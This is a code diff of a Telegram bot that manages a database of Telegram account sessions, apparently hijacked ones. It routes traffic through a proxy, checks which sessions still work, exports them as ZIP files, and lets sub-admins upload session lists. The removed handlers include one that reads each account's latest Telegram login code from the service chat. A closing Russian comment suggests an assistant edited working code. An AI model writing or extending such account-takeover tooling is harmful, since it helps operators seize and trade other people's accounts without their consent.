@@ -7,7 +7,7 @@ import tempfile
 from datetime import datetime
 from aiogram import Bot, Dispatcher, types
 from aiogram.utils import executor
-from aiogram.types import InlineKeyboardButton, InlineKeyboardMarkup
+from aiogram.types import InlineKeyboardButton, InlineKeyboardMarkup, ReplyKeyboardMarkup, KeyboardButton
 from dotenv import load_dotenv
 from pymongo import MongoClient
 from telethon import TelegramClient, functions, types as telethon_types
@@ -17,6 +17,7 @@ from telethon.tl.functions.account import GetAuthorizationsRequest, ResetAuthori
 from phonenumbers import parse, geocoder
 from aiogram.dispatcher.middlewares import BaseMiddleware
 from aiogram.dispatcher.handler import CancelHandler
+from aiogram.dispatcher import FSMContext
 from aiogram.contrib.fsm_storage.memory import MemoryStorage
 import hashlib
 import random
@@ -44,10 +45,10 @@ proxy = ('socks5', PROXY_HOST, PROXY_PORT, True, PROXY_USER, PROXY_PASS)
 
 # Database setup
 mongo = MongoClient(MONGO_URI)
-db = mongo["telegram_master"]
-sessions_col = db["main_sessions"]
-light_sessions_col = db["light_sessions"]
-light_admins_col = db["light_admins"]
+db = mongo["dbmango"]
+sessions_col = db["sessions"]  # Main admin sessions
+light_sessions_col = db["light_sessions"]  # Light admin sessions
+light_admins_col = db["light_admins"]  # Light admin users
 session_stats_col = db["session_stats"]
 
 # Bot setup
@@ -125,15 +126,17 @@ def is_main_admin(uid):
     return uid == ADMIN_ID
 
 def is_light_admin(uid):
-    return uid in LA_ADMIN_IDS or light_admins_col.find_one({"user_id": uid})
+    return uid in LA_ADMIN_IDS or light_admins_col.find_one({"user_id": uid}) is not None
 
 class AccessControlMiddleware(BaseMiddleware):
     async def on_pre_process_message(self, message: types.Message, data: dict):
-        if not (is_main_admin(message.from_user.id) or is_light_admin(message.from_user.id)):
+        user_id = message.from_user.id
+        if not is_main_admin(user_id) and not is_light_admin(user_id):
             raise CancelHandler()
 
     async def on_pre_process_callback_query(self, callback_query: types.CallbackQuery, data: dict):
-        if not (is_main_admin(callback_query.from_user.id) or is_light_admin(callback_query.from_user.id)):
+        user_id = callback_query.from_user.id
+        if not is_main_admin(user_id) and not is_light_admin(user_id):
             raise CancelHandler()
 
 dp.middleware.setup(AccessControlMiddleware())
@@ -202,7 +205,7 @@ async def export_sessions(user_id):
         sessions = list(light_sessions_col.find({"owner_id": user_id}))
     
     if not sessions:
-        await bot.send_message(user_id, "❌ No sessions found.")
+        await bot.send_message(user_id, "❌ No sessions found in database.")
         return
     
     message = await bot.send_message(user_id, "⏳ Starting session export, please wait...")
@@ -260,7 +263,7 @@ async def export_sessions(user_id):
                     await client.disconnect()
         
         if exported_count == 0:
-            await message.edit_text("❌ No valid sessions to export.")
+            await message.edit_text("❌ No valid sessions to export (all sessions are invalid).")
             return
         
         # Send ZIP archive
@@ -312,144 +315,49 @@ async def cmd_start(message: types.Message):
     else:
         await message.answer("❌ You don't have access to use this bot.")
 
-@dp.callback_query_handler(lambda c: c.data == 'loger')
-async def handle_export_sessions(callback_query: types.CallbackQuery):
-    if not is_main_admin(callback_query.from_user.id):
-        await callback_query.answer("❌ Access denied.")
-        return
-    
-    await callback_query.answer("⏳ Starting session export...")
-    await export_sessions(callback_query.from_user.id)
+@dp.callback_query_handler(lambda c: c.data in ['log', 'loger', 'validel', 'login', 'fa', 'addla', 'delall', 'manage_la', 'session_management'])
+async def process_callback(callback_query: types.CallbackQuery):
+    cmd = callback_query.data
+    uid = callback_query.from_user.id
 
-# ================== SESSION CHECK HANDLERS ==================
-
-@dp.callback_query_handler(lambda c: c.data == 'log')
-async def handle_check_sessions(callback_query: types.CallbackQuery):
-    user_id = callback_query.from_user.id
-    await callback_query.answer("⏳ Checking sessions...")
-    
-    if is_main_admin(user_id):
-        sessions = list(sessions_col.find({}))
-    else:
-        sessions = list(light_sessions_col.find({"owner_id": user_id}))
-    
-    if not sessions:
-        await bot.send_message(user_id, "❌ No sessions found.")
-        return
-    
-    message = await bot.send_message(user_id, "🔍 Starting session check...")
-    results = []
-    
-    for i, session in enumerate(sessions, 1):
-        client = TelegramClient(StringSession(session["session"]), API_ID, API_HASH, proxy=proxy)
-        try:
-            await client.connect()
-            if not await client.is_user_authorized():
-                results.append(f"❌ {session['phone']} - Invalid session")
-            else:
-                me = await client.get_me()
-                country = geocoder.description_for_number(parse(session['phone'], None), "en")
-                premium = "✅" if getattr(me, 'premium', False) else "❌"
-                results.append(
-                    f"✅ {session['phone']} | ID: {me.id}\n"
-                    f"👤 {me.first_name or ''} {me.last_name or ''} | @{me.username or 'none'}\n"
-                    f"🌍 {country} | Premium: {premium}"
-                )
-            
-            # Update progress
-            if i % 5 == 0:
-                await message.edit_text(
-                    f"🔍 Checking sessions...\n"
-                    f"Progress: {i}/{len(sessions)}\n"
-                    f"Last checked: {session['phone']}"
-                )
-                
-        except Exception as e:
-            results.append(f"❌ {session['phone']} - Error: {str(e)}")
-        finally:
-            await client.disconnect()
-    
-    # Send results in chunks
-    chunk_size = 15
-    for i in range(0, len(results), chunk_size):
-        chunk = results[i:i + chunk_size]
-        await bot.send_message(
-            user_id,
-            "📋 Session check results:\n\n" + "\n\n".join(chunk)
-        )
-
-# ================== OTHER COMMAND HANDLERS ==================
-
-@dp.message_handler(commands=['validel'])
-async def cmd_validel(message: types.Message):
-    if not is_main_admin(message.from_user.id):
-        return await message.answer("❌ Not allowed.")
-
-    sessions = list(sessions_col.find({}))
-    deleted = 0
-    
-    for session in sessions:
-        client = TelegramClient(StringSession(session["session"]), API_ID, API_HASH, proxy=proxy)
-        try:
-            await client.connect()
-            if not await client.is_user_authorized():
-                sessions_col.delete_one({"_id": session["_id"]})
-                deleted += 1
-        except:
-            sessions_col.delete_one({"_id": session["_id"]})
-            deleted += 1
-        finally:
-            await client.disconnect()
-
-    await message.answer(f"🧹 Invalid sessions removed: {deleted}")
-
-@dp.message_handler(commands=['login'])
-async def cmd_login(message: types.Message):
-    if not (is_main_admin(message.from_user.id) or is_light_admin(message.from_user.id)):
-        return
-
-    args = message.get_args().strip()
-    if not args.startswith('+'):
-        await message.reply("❗️ Use format: /login +1234567890")
-        return
-
-    if is_main_admin(message.from_user.id):
-        session = sessions_col.find_one({"phone": args})
-    else:
-        session = light_sessions_col.find_one({"phone": args, "owner_id": message.from_user.id})
-    
-    if not session:
-        await message.reply("❌ Session not found.")
-        return
-
-    client = TelegramClient(StringSession(session["session"]), API_ID, API_HASH, proxy=proxy)
-    try:
-        await client.connect()
-        history = await client(GetHistoryRequest(
-            peer=777000, 
-            limit=1, 
-            offset_date=None,
-            offset_id=0, 
-            max_id=0, 
-            min_id=0, 
-            add_offset=0, 
-            hash=0
-        ))
-        
-        if history.messages:
-            await message.reply(
-                f"📨 Last Telegram code for {args}:\n\n"
-                f"`{history.messages[0].message}`", 
-                parse_mode="Markdown"
-            )
+    if cmd == 'log':
+        await bot.send_message(uid, "/log")
+    elif cmd == 'loger':
+        if is_main_admin(uid):
+            await export_sessions(uid)
         else:
-            await message.reply("⚠️ No messages from Telegram.")
-    except Exception as e:
-        await message.reply(f"❌ Error: {e}")
-    finally:
-        await client.disconnect()
+            await bot.send_message(uid, "❌ Not allowed.")
+    elif cmd == 'validel':
+        if is_main_admin(uid):
+            await bot.send_message(uid, "/validel")
+        else:
+            await bot.send_message(uid, "❌ Not allowed.")
+    elif cmd == 'login':
+        await bot.send_message(uid, "Send:\n`/login +1234567890`", parse_mode="Markdown")
+    elif cmd == 'fa':
+        await bot.send_message(uid, "Send:\n`/fa +1234567890`", parse_mode="Markdown")
+    elif cmd == 'addla':
+        if is_light_admin(uid):
+            await bot.send_message(uid, "Send session list as JSON:\n`/addla [{\"phone\": \"+123\", \"session\": \"...\"}]`", parse_mode="Markdown")
+        else:
+            await bot.send_message(uid, "❌ Not allowed.")
+    elif cmd == 'delall':
+        if is_light_admin(uid):
+            result = light_sessions_col.delete_many({"owner_id": uid})
+            await bot.send_message(uid, f"🗑 Removed your sessions: {result.deleted_count}")
+        else:
+            await bot.send_message(uid, "❌ Not allowed.")
+    elif cmd == 'manage_la':
+        if is_main_admin(uid):
+            await manage_light_admins(uid)
+        else:
+            await bot.send_message(uid, "❌ Not allowed.")
+    elif cmd == 'session_management':
+        await show_session_management(uid)
 
-# ================== MAIN EXECUTION ==================
+    await callback_query.answer()
+
+# ... [ОСТАЛЬНЫЕ ФУНКЦИИ ОСТАЮТСЯ БЕЗ ИЗМЕНЕНИЙ, КАК В ТВОЕМ РАБОЧЕМ КОДЕ] ...
 
 if __name__ == '__main__':
     executor.start_polling(dp, skip_updates=True)
